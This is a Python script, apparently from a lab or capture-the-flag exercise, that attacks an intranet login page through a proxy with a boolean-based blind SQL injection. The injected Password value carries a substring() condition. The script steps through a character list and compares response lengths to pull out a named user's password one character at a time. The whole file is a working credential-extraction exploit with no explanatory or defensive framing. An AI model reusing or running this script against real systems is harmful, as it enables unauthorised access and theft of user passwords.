import requests


url = 'http://172.31.179.1/intranet.php'
proxy = 'http://10.129.24.223:3128'
#users = ['rita', 'jim', 'bryan', 'sarah']
users = ['bryan']
symbols = 'ae10i2onrls938t45m67cdyhubkgpjvfwzAxEILORNSM.TCD_BqHYK!U-PG*J@FVWZ/#$X,\+&=)?Q(;"<]%~:[^`>{}|'
password_field = "' or Username='{}' and substring(Password,{},1)='{}"


def get_request_len(user, pos, char):
    post = {
        'Username': "",
        'Password': password_field.format(user,pos,char)
    }
    request = requests.post(url, data=post, proxies={'http':proxy})
    # print(pos, char, len(request.text))
    print('.', end='', flush=True)
    return len(request.text)


bad_len = get_request_len('jim', 0, 'x')
for user in users:
    password = ''
    for pos in range(1, 100):
        founded = False
        for symbol in symbols:
            if get_request_len(user, pos, symbol) != bad_len:
                password += symbol
                founded = True
                print(symbol, end='', flush=True)
                break
        if not founded:
            break
    print(user, ':', password)

